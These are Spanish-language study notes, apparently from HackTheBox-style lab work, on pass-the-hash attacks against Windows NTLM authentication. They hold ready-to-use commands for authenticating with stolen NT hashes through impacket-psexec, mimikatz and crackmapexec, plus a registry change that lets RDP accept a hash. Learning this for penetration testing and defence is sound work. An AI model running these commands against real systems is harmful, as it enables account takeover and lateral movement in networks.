# Pass the hash

- [more info](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key)

## Español:

#### Definición
- El ataque PTH es una tecnica utilizada para comprometer cuentas en ambientes windows sin tener la necesidad de conocer las contraseñas en texto plano. En lugar de usar la contraseña se utiliza el hash de la misma para autenticarse.

## Utilización
1. Post explotación
2. Movimiento lateral: Para moverse lateralmente dentro de una red si la maquina comprometida tiene acceso a recursos compartidos.
3. Escalación de privilegios

## Funcionamiento
- Mediante NTLM.
- NTLM es un protocolo de autenticación Windows que no requiere la contraseña en texto plano para validar autenticaciones (hashes NT).
    - Obtener hash NT de un usuario (dumping de credenciales con mimikatz x ej).
    - Usar el hash para autenticarse.
    - Acceder a recursos protegidos (smb, rdp, winrm, etc).

### Impacket con psexec
`impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453`
`DOMAIN/USER@TARGET -hashes LMHASH:NTHASH`

### Mimikatz
- Permite autenticar usando hashes con el modulo `sekurlsa::pth`
`sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:COMMAND`
`sekurlsa::pth /user:admin /domain:. /ntlm:0123456789abcdef0123456789abcdef /run:cmd.exe`

### Crackmapexec
`crackmapexec smb TARGET_IP -u USER -H NTHASH`
`cme smb 192.168.1.10 -u admin -H 0123456789abcdef0123456789abcdef`

## Permitir Pth con RDP
`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
- ![](https://academy.hackthebox.com/storage/modules/147/rdp_session-5.png)
- Una vez de que la llave fue agregada al registro del sistema podemos intntar usar xfreerdp con la opción /pth